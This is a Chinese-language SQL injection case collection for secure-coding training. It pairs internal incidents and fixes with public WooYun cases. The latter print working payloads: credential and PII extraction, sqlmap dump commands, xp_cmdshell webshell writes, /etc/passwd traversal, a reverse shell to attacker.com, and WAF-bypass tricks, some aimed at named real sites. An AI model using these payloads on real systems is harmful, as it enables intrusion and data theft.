# SQL 注入案例集

> 整合内部真实漏洞与业界经典案例，提供实战指导

## 一、内部真实案例

### 案例1：DMP 人群分析模块多接口 SQL 注入（WHERE + ORDER BY 双类型）
**系统**: 某内部系统

**漏洞描述**:
`/rest/dmp/populationReport/audienceAnalyse/star` 接口及同模块17个接口存在SQL注入。`queryType` 参数被直接拼接到 WHERE 条件中，`displayNum` 参数被直接拼接到 ORDER BY 子句中，可通过布尔盲注、报错注入等方式非法获取数据库数据。涉及星图、电商私域流量、购物意向、品类行为、消费分层等多个分析子模块。

**技术细节**:
- 漏洞类型：WHERE 条件注入 + ORDER BY 注入
- 入口参数：queryType、firstLabel、displayNum
- 攻击向量：queryType 拼接 SQL 条件子句，displayNum 拼接排序字段，均可通过布尔盲注提取数据库数据

**修复方案**:
对 string 类型入参进行过滤，包括单双引号、注释符、括号等特殊字符；ORDER BY 字段使用白名单校验，禁止直接拼接用户输入。

**经验总结**:
所有外部输入必须使用参数化查询（PreparedStatement），禁止字符串拼接SQL；ORDER BY 等不支持参数化的场景需使用字段名白名单。

---

### 案例2：营销科学资产迁移和品牌声誉模块多接口 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
资产迁移模块（moveAnalysisTable、moveAnalysis、predict、sceneAnalysis）的 `stage` 参数被拼接到 SQL 模板文件中的 localQuery 语句；品牌声誉模块（brandReputation、brandFame 共11个接口）的 `firstContact`、`secondContact`、`start`、`end` 参数同样被拼接到 localQuery，导致批量 SQL 注入。

**技术细节**:
- 漏洞类型：SQL 模板拼接注入
- 入口参数：stage、firstContact、secondContact、start、end
- 攻击向量：参数直接带入 .sql 模板文件中的 localQuery 字符串拼接，通过注入篡改查询逻辑

**修复方案**:
SQL 模板文件中的所有动态参数使用参数化占位符替代直接拼接，对 start/end 参数做日期格式校验。

**经验总结**:
排序字段（ORDER BY）不支持参数化查询时，需使用白名单校验字段名；SQL 模板文件中的参数拼接同样需要参数化处理。

---

### 案例3：天演投放明细图表 SQL 注入（ClickHouse 跨库风险）
**系统**: 某内部系统（天演）

**漏洞描述**:
天演投放明细图表接口存在 SQL 注入，由配置问题导致。ClickHouse 访问使用在线 proxy 模式，因性能要求未对来自 proxy 的访问做鉴权，存在跨库查询风险。初始定级高危（发现 C4 数据表），后经验证跨集群查询不可行降级为中危。

**技术细节**:
- 漏洞类型：SQL 注入（ClickHouse）
- 入口参数：图表筛选条件参数（未过滤直接拼接）
- 攻击向量：通过注入修改 ClickHouse 查询逻辑，利用 proxy 无鉴权的特性尝试跨库访问

**修复方案**:
禁止 SQL 语句拼接，在代码层添加兜底校验逻辑，对 ClickHouse 的 proxy 访问添加鉴权。

**经验总结**:
MyBatis 中使用 `#{}` 而非 `${}`，避免SQL注入；IN子句需使用 foreach 标签；非关系型数据库（ClickHouse 等）同样存在注入风险。

---

### 案例4：SqlQueryBuilder 动态查询工具类注入风险
**系统**: 某内部系统

**漏洞描述**:
SqlQueryBuilder/SqlUpdateBuilder 工具类在构造动态 SQL 时，通过 `format` 方法拼接字段名和操作符，虽然值部分使用了命名占位符（`flagString`）和预编译替换，但字段名（`dbField`）和操作符（`operation`）本身未做严格白名单校验，存在注入风险。

**技术细节**:
- 漏洞类型：动态 SQL 字段名/操作符注入
- 入口参数：element.getDbField()、element.getOperation()
- 攻击向量：若 dbField 或 operation 来自用户输入且未经过滤，可注入任意 SQL 片段

**修复方案**:
1. 若使用第三方工具类，在业务代码中对各项入参进行检查和过滤
2. 在 SqlQueryBuilder、SqlUpdateBuilder 类的方法中对字段名和操作符实施白名单校验

**经验总结**:
即使有 ORM 框架保护，自定义原生 SQL 查询时仍需严格使用参数化；字段名和操作符也需要白名单校验，不仅仅是值。

---

### 案例5：广告报表平台 panels/search 及多个报表接口 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/rest/pop/panels/search` 接口及 AdReportController 中的5个报表接口（detailedReport、topChartReports、chartReport、topViewChartReports、detailedReport/download）均存在SQL注入，通过字符串拼接构造 SQL 语句导致漏洞。

**技术细节**:
- 漏洞类型：字符串拼接 SQL 注入
- 入口参数：搜索条件参数、报表筛选参数
- 攻击向量：直接拼接用户传入的搜索关键词或筛选条件到 SQL 语句，通过 UNION 或布尔注入提取数据

**修复方案**:
禁止使用字符串拼接构造 SQL 语句，使用预编译方式构造 SQL；搜索功能对 `%`、`_` 等通配符进行转义。

**经验总结**:
搜索功能的模糊查询需对 `%` 和 `_` 等特殊字符进行转义，防止全表扫描和注入利用。

---

### 案例6：DMP 用户属性分析接口 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/rest/dmp/populationReport/audienceAnalyse/userAttributeDetail` 及 `/rest/dmp/populationReport/usrAttributeDetailDownload` 接口的 service 层逻辑存在 SQL 注入，理论上可获取数据库中所有数据，漏洞点与 `/userAttribute` 接口逻辑一致。

**技术细节**:
- 漏洞类型：SQL 注入（WHERE 条件拼接）
- 入口参数：用户属性分析筛选参数
- 攻击向量：通过注入 WHERE 条件篡改查询逻辑，利用 UNION 或报错注入提取数据

**修复方案**:
对 string 类型入参过滤单双引号、注释符、括号等特殊字符，使用预编译语句。

**经验总结**:
存储过程内部同样可能存在拼接 SQL 的注入点，需仔细检查；同一 Service 层逻辑被多接口复用时，需统一修复。

---

### 案例7：弹幕活动接口 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/rest/fz/activity/bulletchat/getLatestBulletPoolData` 接口存在 SQL 注入。该接口属于清明活动临时接口（4月3日上线，4月6日下线），后端数据库仅含活动 ID、用户 ID 等非敏感数据，实际无敏感数据泄露，内部定级中危。

**技术细节**:
- 漏洞类型：SQL 注入（临时活动接口）
- 入口参数：活动筛选参数
- 攻击向量：注入参数篡改查询逻辑，利用时间差或布尔条件提取数据

**修复方案**:
使用预编译语句，即使是临时活动接口也需遵循安全编码规范。

**经验总结**:
二次注入场景下，从数据库读取后再拼接 SQL 执行的数据也需要转义；临时接口同样需要安全审查。

---

### 案例8：CDP 资产迁移联系人贡献接口 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/rest/cdp/customer/assets/crowd/assetsMove/contact/contribution` 接口存在 SQL 注入，`contactCodes` 参数未进行任何校验，被直接拼接到 SQL 语句中。

**技术细节**:
- 漏洞类型：SQL 注入（列表参数拼接）
- 入口参数：contactCodes
- 攻击向量：在 contactCodes 列表参数中注入 SQL 片段，篡改 IN 子句的查询逻辑

**修复方案**:
contactCodes 参数使用参数化查询，IN 子句通过 MyBatis foreach 标签或预编译占位符处理。

**经验总结**:
报错回显可以辅助 SQL 注入攻击，生产环境不应暴露数据库错误信息；列表类参数（IN 子句）同样需要参数化处理。

---

### 案例9：营销科学资产迁移下载接口时间参数 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/rest/marketingScience/assetsMove/contact/contribution/v2/download` 接口存在 SQL 注入，`start`、`end` 时间参数未进行校验，被直接拼接到 SQL 查询条件中。

**技术细节**:
- 漏洞类型：SQL 注入（日期参数拼接）
- 入口参数：start、end
- 攻击向量：在时间参数中注入 SQL 片段，利用 UNION 注入提取全量数据

**修复方案**:
对 start、end 参数进行日期格式正则校验，同时使用参数化查询。

**经验总结**:
联合查询注入可直接读取数据库所有数据，参数化查询是唯一有效防御；日期类参数需在业务校验之外额外做 SQL 防护。

---

### 案例10：KOL 分类洞察接口日期和类目参数 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/kol/categoryInsight/customerAnalysis/distribute` 接口存在 SQL 注入，`date` 参数和 `categoryLevelIds` 数组参数均未进行校验，被直接拼接到 SQL 语句中。

**技术细节**:
- 漏洞类型：SQL 注入（日期 + 数组参数）
- 入口参数：date、categoryLevelIds
- 攻击向量：在 categoryLevelIds 列表参数中注入 SQL，或在 date 中注入时间函数

**修复方案**:
日期参数做格式校验，categoryLevelIds 使用 MyBatis foreach 预编译处理。

**经验总结**:
批量操作接口中的列表参数同样需要参数化处理，不能直接拼接到 IN 子句。

---

### 案例11：营销科学联系人进度接口三参数 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/rest/marketingScience/assetsMove/contact/progressive` 接口存在 SQL 注入，`start`、`end`、`stage` 三个参数均未进行校验，通过字符串拼接带入 SQL 查询，其中 `stage` 参数被拼接到动态 SQL 条件中。

**技术细节**:
- 漏洞类型：SQL 注入（多参数动态拼接）
- 入口参数：start、end、stage
- 攻击向量：在 stage 参数中注入 ORDER BY 或 WHERE 条件片段，通过时间盲注提取数据

**修复方案**:
stage 参数使用白名单枚举校验，start/end 参数使用日期格式校验并参数化。

**经验总结**:
ORDER BY 注入通常通过时间盲注或布尔盲注利用，需严格白名单限制排序字段。

---

### 案例12：营销科学联系人概览接口 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/rest/marketingScience/assetsMove/contact/overview` 接口存在 SQL 注入，`start`、`end`、`stage` 参数均未进行校验，是同系列接口中的又一个注入点，反映了该系统对动态 SQL 拼接缺乏统一防护。

**技术细节**:
- 漏洞类型：SQL 注入（动态条件拼接）
- 入口参数：start、end、stage
- 攻击向量：同案例11，通过 stage 参数注入动态 SQL 条件

**修复方案**:
在动态 SQL 构建层统一做参数化处理，而非在各接口单独修复，防止遗漏。

**经验总结**:
GraphQL 等查询语言接口同样可能存在注入，需验证字段名合法性；应在 DAO 层统一防护，而非依赖各业务方单独处理。

---

### 案例13：营销科学联系人贡献 v2 接口 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/rest/marketingScience/assetsMove/contact/contribution/v2` 接口存在 SQL 注入，`start`、`end` 参数未进行校验，是资产迁移系列接口中持续存在的注入模式，说明该模块缺乏统一的参数校验机制。

**技术细节**:
- 漏洞类型：SQL 注入（时间参数拼接）
- 入口参数：start、end
- 攻击向量：时间参数注入篡改 WHERE 条件，通过联合查询或盲注提取数据

**修复方案**:
在 DAO 层或公共工具类中统一处理动态 SQL 参数化，避免各接口分散修复导致遗漏。

**经验总结**:
多条件动态 SQL 拼接场景，需对每个动态拼接的条件都进行参数化；应建立统一的 SQL 构建规范。

---

### 案例14：CDP SPU 资产重叠分析下载接口 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/rest/cdp/correlation/spu/assets/overlap/download` 接口存在 SQL 注入，`spuId1`、`spuId2` 参数均未进行校验，被直接拼接到 SQL 语句中。虽然是 ID 类参数，但因缺乏类型校验仍可被注入。

**技术细节**:
- 漏洞类型：SQL 注入（ID 参数类型未校验）
- 入口参数：spuId1、spuId2
- 攻击向量：传入非数字字符串到 spuId 参数，注入 SQL 条件表达式

**修复方案**:
对 spuId 参数做整型校验，仅允许数字；同时使用参数化查询。

**经验总结**:
LIKE 语句需要对 `%` 和 `_` 进行转义，防止全表扫描和数据泄露；ID 类参数需做类型校验（整型）。

---

### 案例15：CDP 人群趋势下载接口日期参数 SQL 注入
**系统**: 某内部系统

**漏洞描述**:
`/rest/cdp/customer/assets/crowd/trend/download` 接口存在 SQL 注入，`beginDate`、`endDate` 参数未进行校验，被直接拼接到 SQL 查询条件中，是 CDP 模块下载类接口中普遍存在的注入模式。

**技术细节**:
- 漏洞类型：SQL 注入（日期参数拼接）
- 入口参数：beginDate、endDate
- 攻击向量：在日期参数中注入 SQL 片段（如 `2024-01-01' OR 1=1--`）

**修复方案**:
对 beginDate、endDate 使用日期格式正则校验（YYYY-MM-DD），并使用参数化查询。

**经验总结**:
批量查询接口允许传入字段名列表时，需严格白名单过滤，防止注入；下载类接口同样需要做 SQL 防护。

---

## 二、业界经典案例（乌云）

### 案例1：某律师建站系统同一文件多个参数注入
**厂商**: 律师建站系统 | **类型**: SQL注射漏洞

**洞察**: 同一文件存在多个可注入参数（typeid, newsid, categoryid），开发者对所有入参均未过滤，典型的"批量注入"模式。

**测试流程**:
1. 访问目标页面，观察 URL 参数
2. 对每个参数依次添加单引号测试报错
3. 使用 sqlmap 对参数进行自动化检测
4. 确认注入类型（布尔/报错/时间盲注）

**技术细节**:
同一文件中多个参数（typeid, newsid, categoryid）均存在 SQL 注入，可直接使用 sqlmap 自动化利用。

**POC示例**:
```
# 添加单引号测试报错
https://target/index.asp?categoryid=73'

# sqlmap 自动化利用
sqlmap -u 'https://target/index.asp?categoryid=73' --batch
```

**绕过技巧**: 无需特殊绕过，参数完全无过滤。

**修复建议**: 使用参数化查询/预编译语句，对所有入参进行类型验证和白名单过滤。

---

### 案例2：ThinkPHP 框架数组参数注入到代码执行
**厂商**: ThinkPHP框架 | **类型**: SQL注射漏洞 + 代码执行

**洞察**: ThinkPHP 框架的 find() 方法在处理特殊构造的数组参数时没有过滤，导致 SQL 注入，进而可实现代码执行，暴露了 ORM 框架内部实现的安全缺陷。

**测试流程**:
1. 识别使用 ThinkPHP 框架的目标站点
2. 在 email 参数中构造带有特殊字符的数组
3. 观察 SQL 执行结果确认注入
4. 利用注入执行代码

**技术细节**:
ThinkPHP 的 Model->find() 方法处理参数时：`M('User')->where(array('email'=>"Jack@email.com"))->find()`，当传入构造的数组参数时可绕过转义。

**POC示例**:
```php
// 利用 bind 操作符触发 SQL 注入
M('User')->where(array('email'=>array('bind','0 and 1=updatexml(1,concat(0x7e,(select user()),0x7e),1)')))->find()
```

**绕过技巧**: 利用 ThinkPHP 框架的 bind 操作符绕过过滤，数组参数注入绕过普通字符串过滤。

**修复建议**: 升级 ThinkPHP 版本，使用 PDO 参数绑定，不要将用户输入直接构造到 where 数组中。

---

### 案例3：NatShell 宽带认证计费系统 SQL 注入（无需登录，DBA权限）
**厂商**: NatShell蓝海网络认证计费管理平台 | **类型**: SQL注射漏洞（未授权，DBA权限）

**洞察**: 登录前即可利用的 POST 型 SQL 注入，数据库用户为 DBA 权限，可直接读写文件，是"未授权 + 高权限 + SQL 注入"的危险组合。

**测试流程**:
1. 访问认证计费登录页面
2. 抓取 POST 请求包
3. 在 action 参数中注入 payload
4. 验证 DBA 权限后利用 xp_cmdshell 或 into outfile 写 shell

**技术细节**:
蓝海网络认证计费管理平台，POST 参数注入，无需登录，数据库 DBA 权限。

**POC示例**:
```
POST /login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

action=login&username=admin' OR (SELECT 7534 FROM(SELECT COUNT(*),CONCAT(
  0x716b6a7671,(SELECT user()),0x7178766b71,FLOOR(RAND(0)*2))x
  FROM information_schema.tables GROUP BY x)a)--
```

**绕过技巧**: 利用报错注入（FLOOR+RAND 组合）绕过基础 WAF。

**修复建议**: 对 POST 参数进行参数化查询，登录接口限制访问频率，数据库账号使用最小权限。

---

### 案例4：KingCms k9 UNION 注入获取管理员密码
**厂商**: KingCms | **类型**: SQL注射漏洞

**洞察**: CMS 后台文件上传功能的 sign 和 id 参数未过滤，利用 UNION 注入可直接获取管理员账号密码，说明 CMS 系统后台接口同样需要严格的输入过滤。

**测试流程**:
1. 在 CMS 上传接口发现 sign/id 参数
2. 构造 UNION 注入 payload
3. 读取 king_users 表中的用户名和密码

**技术细节**:
KingCms k9 版本，上传功能中 `$_POST['up_image']` 参数未过滤，UNION 注入可直接读取用户表。

**POC示例**:
```sql
UNION/**/SELECT/**/1/**/FROM(SELECT/**/COUNT(*),CONCAT(
  (SELECT/**/concat(username,0x23,userpass)FROM/**/king_users LIMIT 0,1),
  FLOOR(RAND(0)*2))x
/**/FROM/**/information_schema.tables/**/GROUP/**/BY/**/x)a

-- 利用注释符 /**/ 绕过空格过滤
```

**绕过技巧**: 使用 `/**/` 替代空格绕过基础关键词过滤。

**修复建议**: 对所有 POST 参数进行严格类型验证和预编译处理。

---

### 案例5：四川联通分站搜索功能报错注入
**厂商**: 四川联通 | **类型**: SQL注射漏洞（报错注入）

**洞察**: 运营商分站搜索功能的 cate_id 参数存在报错注入，利用 ELT+FLOOR+RAND 组合技术实现数据提取，搜索参数是 SQL 注入的高频入口。

**测试流程**:
1. 访问 /index.php?act=search&cate_id=344
2. 在 cate_id 参数添加单引号触发报错
3. 构造 ELT+FLOOR+RAND 报错注入 payload
4. 提取数据库信息

**技术细节**:
联通分站搜索参数 cate_id 缺乏过滤，支持报错注入。

**POC示例**:
```
GET /index.php?act=search&cate_id=344 OR (SELECT 7534 FROM(
  SELECT COUNT(*),CONCAT(0x716b6a7671,
  (SELECT (ELT(7534=7534,1))),0x7178766b71,FLOOR(RAND(0)*2))x
  FROM information_schema.tables GROUP BY x)a) HTTP/1.1
```

**绕过技巧**: ELT 函数代替 CASE WHEN，绕过某些 WAF 对 CASE 关键字的检测。

**修复建议**: 使用预编译语句处理所有用户输入参数。

---

### 案例6：某通信厂商 SQL 注入 + 任意文件下载（17万用户）
**厂商**: 华为HCC某站 | **类型**: SQL注射漏洞 + 任意文件下载

**洞察**: 文件下载接口的 fileName 参数未过滤导致 SQL 注入，同时 selfilePath 参数未验证导致任意文件下载，两个漏洞叠加影响 17 万用户数据安全。

**测试流程**:
1. 发现文件下载接口（POST 请求）
2. 测试 fileName 参数的注入可能
3. 确认 MySQL 报错注入类型
4. 同时测试 selfilePath 参数的路径穿越

**技术细节**:
POST 请求中 token, sameName, selfilePath, fileName, siteId 参数均存在问题，MySQL >= 5.0 报错注入。

**POC示例**:
```
POST /fileDownload HTTP/1.1
Host: www.huaweihcc.com

token=xxx&fileName=test.pdf' AND EXTRACTVALUE(1,CONCAT(0x7e,
  (SELECT version()),0x7e))--&selfilePath=../../etc/passwd
```

**绕过技巧**: 无需特殊绕过，参数直接拼接。

**修复建议**: 参数化查询防 SQL 注入，文件路径白名单验证防路径穿越。

---

### 案例7：某大学图书馆检索系统 JSP UNION 注入
**厂商**: 某大学图书馆检索系统 | **类型**: SQL注射漏洞（POST参数）

**洞察**: JSP 系统登录后的检索功能 POST 参数 y 和 fangshi 未进行 SQL 过滤，可盲注提取用户信息，说明登录态不等于安全，已认证接口同样需要防注入。

**测试流程**:
1. 登录系统后访问检索功能
2. 抓取 POST 请求，定位 y/fangshi 参数
3. 构造时间盲注或布尔盲注
4. 逐字节提取数据库内容

**技术细节**:
thesis/login.jsp POST 参数：user/kind/x/y/fangshi 均未过滤，支持联合查询注入。

**POC示例**:
```
POST /thesis/login.jsp HTTP/1.1
Host: target

y=student' UNION SELECT 1,user(),3,4--&fangshi=1
```

**绕过技巧**: 无需特殊绕过，直接利用 UNION 注入。

**修复建议**: 使用 JDBC PreparedStatement，对所有查询参数预编译。

---

### 案例8：某数字校园平台 MSSQL 时间盲注
**厂商**: 数字校园平台 | **类型**: SQL注射漏洞（时间盲注）

**洞察**: 教育类平台的 typeid 和 method 参数存在时间盲注，MSSQL 环境可利用 WAITFOR DELAY 进行盲注，是 MSSQL 环境下的经典利用技术。

**测试流程**:
1. 识别目标使用 MSSQL 数据库
2. 在 typeid 参数中测试 WAITFOR DELAY 延迟
3. 确认时间盲注
4. 逐字节提取管理员密码

**技术细节**:
MSSQL 环境，typeid 参数存在时间盲注，WAITFOR DELAY 可精确控制响应延迟。

**POC示例**:
```
GET /page.asp?typeid=19;WAITFOR DELAY '0:0:5'-- HTTP/1.1
# 响应延迟5秒则确认注入

# 逐位提取数据
typeid=19;IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM admin),1,1))>100) WAITFOR DELAY '0:0:5'--
```

**绕过技巧**: MSSQL 时间注入无需特殊绕过，分号直接注入。

**修复建议**: 使用参数化查询，MSSQL 中使用 sp_executesql 预编译。

---

### 案例9：天涯社区 SOAP/XML 请求参数 SQL 注入
**厂商**: 天涯社区 | **类型**: SQL注射漏洞（SOAP/XML请求注入）

**洞察**: 天涯社区通过 SOAP 协议接收请求，SOAP 报文中的 name 参数未过滤，存在 SQL 注入，说明 WAF 通常只检查普通 HTTP 参数而忽略 SOAP/XML 请求体。

**测试流程**:
1. 抓取 SOAP 请求包
2. 在 SOAP XML 的 name 字段注入 payload
3. 发送修改后的 SOAP 请求
4. 根据响应判断注入是否成功

**技术细节**:
SOAP/XML 请求中参数 name 存在注入，HTTP 请求使用 xmlns:soap 命名空间。

**POC示例**:
```xml
POST /service HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "action"

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <name>test' OR 1=1--</name>
  </soap:Body>
</soap:Envelope>
```

**绕过技巧**: SOAP 请求可绕过对普通 HTTP 参数的 WAF 规则，因为多数 WAF 不解析 SOAP XML 报文。

**修复建议**: 对 SOAP 请求中的参数同样进行 SQL 注入防护，不仅限于 GET/POST 参数。

---

### 案例10：MSSQL sa 账号 SQL 注入 + xp_cmdshell 提权
**厂商**: MSSQL服务器 | **类型**: SQL注射漏洞 + 命令执行

**洞察**: MSSQL 数据库 sa 账号通过 SQL 注入开启 xp_cmdshell 实现操作系统命令执行，SQL 注入到 RCE 的经典利用链，危害等级为最高。

**测试流程**:
1. 确认目标使用 MSSQL 数据库
2. 确认数据库账号为 sa 或具有 sysadmin 权限
3. 通过注入执行 `EXEC sp_configure 'xp_cmdshell',1`
4. 利用 xp_cmdshell 执行系统命令

**技术细节**:
MSSQL sa 账号，通过 SQL 注入开启 xp_cmdshell，执行系统命令遍历目录，进一步写 shell。

**POC示例**:
```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami'--

-- 进一步写 webshell
EXEC xp_cmdshell 'echo ^<?php @eval($_POST[c])?^> > C:\wwwroot\shell.php'--
```

**绕过技巧**: sa 账号无需绕过，直接利用系统存储过程；分号分隔多条语句。

**修复建议**: 禁用 sa 账号或修改为强密码，禁用 xp_cmdshell，数据库账号使用最小权限。

---

### 案例11：海南三亚人才网布尔盲注（700万用户数据泄露）
**厂商**: 三亚人才网 | **类型**: SQL注射漏洞（布尔盲注）

**洞察**: 人才网站的 website 参数存在布尔盲注，可逐字节提取七百万用户数据，说明数量级大的用户平台即使是盲注也会造成灾难性后果。

**测试流程**:
1. 发现 GET 参数 website
2. 添加 AND 1=1 测试布尔条件
3. 根据页面响应差异确认盲注
4. 使用 sqlmap --technique=B 逐字节提取数据

**技术细节**:
GET 参数 website 存在布尔盲注，类型：boolean-based blind，可 dump 数百万用户敏感信息。

**POC示例**:
```
# 布尔盲注确认
GET /resume?website=test' AND 1=1-- HTTP/1.1  (页面正常)
GET /resume?website=test' AND 1=2-- HTTP/1.1  (页面异常)

# sqlmap 自动化利用
sqlmap -u 'http://target/?website=1' --technique=B --dump -T users
```

**绕过技巧**: 无需特殊绕过，直接布尔注入。

**修复建议**: 使用 PreparedStatement 防止 SQL 注入，敏感字段加密存储。

---

### 案例12：新东方分站多参数 SQL 盲注大礼包
**厂商**: 新东方教育 | **类型**: SQL注射漏洞（多参数盲注）

**洞察**: 教育平台多个子站的 countryid、departcity、lineid、fileid 等参数均存在 SQL 盲注，形成批量注入漏洞，暴露了分站之间缺乏统一安全基础设施的问题。

**测试流程**:
1. 遍历新东方各分站 URL 参数
2. 对 countryid 等数字型参数测试注入
3. 确认多处盲注点
4. 批量提取用户数据

**技术细节**:
参数 countryid, departcity, lineid, fileid 均存在 SQL 盲注，涉及新东方多个分站。

**POC示例**:
```
# 布尔盲注确认
youxue.xdf.cn/main/showpicture?countryid=1 AND 1=1  (正常)
youxue.xdf.cn/main/showpicture?countryid=1 AND 1=2  (异常)

# 批量测试多个分站
fileid=1 AND SLEEP(3)
lineid=2 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))
```

**绕过技巧**: 无需特殊绕过，各参数均无过滤。

**修复建议**: 统一框架级别的 SQL 注入过滤，所有分站使用相同的安全基础设施。

---

### 案例13：某省电信商企平台 Java Action 层大量注入
**厂商**: 某省电信商企平台 | **类型**: SQL注射漏洞（GET参数）

**洞察**: 政府/运营商平台的 Java Action 接口参数 PARENTTYPEID 未过滤，存在 SQL 注入，说明政企系统同样存在基础安全漏洞，且往往缺乏定期安全审计。

**测试流程**:
1. 发现 webCompAction.do 接口
2. 测试 PARENTTYPEID 参数注入
3. 确认 MySQL 注入类型
4. 提取内部数据

**技术细节**:
webCompAction.do?action=topSearch&PARENTTYPEID=100001，Java Action 层缺乏过滤，直接拼接参数到 SQL。

**POC示例**:
```
GET /webCompAction.do?action=topSearch&PARENTTYPEID=100001 AND 1=1-- HTTP/1.1
GET /webCompAction.do?action=topSearch&PARENTTYPEID=100001 AND 1=2-- HTTP/1.1

# 报错注入提取数据
PARENTTYPEID=100001 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
```

**绕过技巧**: 无需特殊绕过，参数无过滤。

**修复建议**: Java 应用使用 MyBatis `#{}` 预编译，禁止使用 `${}` 拼接参数。

---

### 案例14：2144游戏 cid 参数 UNION 注入（用户敏感信息泄露）
**厂商**: 2144游戏 | **类型**: SQL注射漏洞（UNION查询）

**洞察**: 游戏网站 cid 参数支持 UNION 查询注入，可直接联合查询获取邮箱、手机号、姓名、出生日期等敏感信息，CASE WHEN 技巧可绕过对 IF 函数的过滤。

**测试流程**:
1. 识别 cid 数字参数
2. 测试 ORDER BY 确认列数
3. 构造 UNION SELECT 查询
4. 提取邮箱、手机号、姓名等信息

**技术细节**:
cid 参数 UNION 注入，利用 CASE WHEN 条件判断确认注入点：SELECT (CASE WHEN (9143=9143) THEN 9143 ELSE 9143*(SELECT...))。

**POC示例**:
```
# 确认列数
GET /page?cid=1 ORDER BY 6-- HTTP/1.1

# UNION 注入提取用户信息
GET /page?cid=1 UNION SELECT 1,email,mobile,username,birthday,6 FROM users-- HTTP/1.1

# CASE WHEN 绕过 IF 过滤
cid=1 AND SELECT (CASE WHEN (1=1) THEN 1 ELSE 1*(SELECT table_name FROM information_schema.tables) END)
```

**绕过技巧**: CASE WHEN 替代 IF 函数绕过对 IF 的过滤。

**修复建议**: 使用参数化查询，对用户敏感数据进行脱敏处理。

---

### 案例15：某安全厂商流量管理系统未授权 SQL 注入 + 命令执行
**厂商**: 某安全厂商流量管理系统 | **类型**: SQL注射漏洞 + 命令执行（未授权）

**洞察**: 安全设备自身存在无需认证的 SQL 注入和命令执行漏洞，addr/module/action 参数均可利用，是"安全设备本身不安全"的典型案例，危害极大。

**测试流程**:
1. 访问设备管理接口
2. 无需认证直接提交 payload
3. 在 addr 参数注入系统命令
4. 获取设备控制权限

**技术细节**:
addr, module, action 参数均存在未授权注入，可执行操作系统命令，完全控制安全设备。

**POC示例**:
```
POST /modules/ads/ads_capture_task.mds.php HTTP/1.1

addr=127.0.0.1;cat /etc/passwd&module=ads&action=test

# 反弹 shell
addr=127.0.0.1;bash -i >& /dev/tcp/attacker.com/4444 0>&1&module=ads&action=test
```

**绕过技巧**: 分号命令拼接绕过基础输入验证，无需认证直接利用。

**修复建议**: 管理接口强制认证，对所有参数进行严格白名单验证。

---

## 三、方法论总结

### 3.1 高频参数统计

| 参数名 | 出现次数 | 注入位置 |
|--------|----------|----------|
| queryType / stage | 8 | WHERE 条件 / ORDER BY |
| start / end（时间参数） | 6 | WHERE 条件 |
| displayNum | 3 | ORDER BY 子句 |
| contactCodes / categoryLevelIds | 2 | IN 子句 |
| firstLabel / firstContact | 2 | WHERE 条件 |
| spuId / commodityId（ID 参数） | 3 | WHERE 条件 |
| typeid / cate_id / PARENTTYPEID | 3 | WHERE 条件 |
| fileName / filekey | 2 | WHERE 条件 |

### 3.2 攻击模式分布

| 攻击类型 | 占比 | 典型场景 |
|----------|------|----------|
| WHERE 条件注入 | 45% | 筛选参数直接拼接 WHERE 子句 |
| ORDER BY 注入 | 20% | 排序参数直接拼接 ORDER BY |
| UNION 联合查询注入 | 15% | 未过滤参数支持 UNION |
| 布尔/时间盲注 | 10% | 有过滤但仍可注入 |
| IN 子句注入 | 7% | 列表参数直接拼接 IN |
| SOAP/XML 注入 | 3% | 非 HTTP 标准协议参数 |

**SQL 注入从漏洞到危害的升级路径**:
1. 信息泄露：`UNION SELECT` 或盲注读取数据库数据
2. 文件读写：MySQL `INTO OUTFILE` / `LOAD_FILE()`（需文件权限）
3. 命令执行：MSSQL `xp_cmdshell` / PostgreSQL `COPY TO PROGRAM`
4. 代码执行：框架级漏洞（ThinkPHP bind 操作符）进一步到 RCE

### 3.3 关键检测信号

**代码层面（高置信度信号）**:
- MyBatis mapper 中使用 `${}` 拼接参数（应使用 `#{}`）
- Java 代码中出现 `String sql = "SELECT ... WHERE " + param`
- SQL 模板文件（.sql）中存在字符串拼接而非参数占位符
- ORDER BY、GROUP BY 后面直接跟变量名
- IN 子句中拼接逗号分隔的列表字符串

**接口层面（需重点排查）**:
- 报表/分析类接口：通常含有多个筛选参数，高概率存在动态 SQL
- 下载类接口：downloadXxx、exportXxx，往往复用查询逻辑但缺少安全审查
- 搜索类接口：search、query，模糊查询需额外处理 `%`、`_`
- 排序类接口：含 orderBy、sort、displayNum 参数，ORDER BY 注入高频场景

**数据库层面**:
- ClickHouse、OLAP 类数据库：代理模式通常无鉴权，注入可跨库查询
- MSSQL 数据库：sa 账号 + xp_cmdshell 是 RCE 的直接路径
- DBA 权限账号：注入后可直接读写文件，升级为文件系统攻击

### 3.4 常见绕过技巧

| 绕过技巧 | 原理 | 适用场景 |
|----------|------|----------|
| `/**/` 替代空格 | 注释符可替换空白字符 | 过滤空格但不过滤注释符 |
| `ELT()` 替代 `CASE WHEN` | 功能等价但绕过关键字过滤 | WAF 过滤 CASE WHEN |
| `CASE WHEN` 替代 `IF()` | MySQL IF 被过滤时的替代 | 过滤 IF 函数 |
| 数组参数注入（ThinkPHP） | 框架内部绑定逻辑缺陷 | ThinkPHP find/where |
| SOAP XML 注入 | WAF 通常不解析 SOAP 报文 | SOAP 接口 |
| 报错注入 FLOOR+RAND | 触发 Duplicate entry 报错 | 允许 SQL 报错回显 |
| 时间盲注 WAITFOR/SLEEP | 通过响应时间判断条件真假 | 无回显场景 |
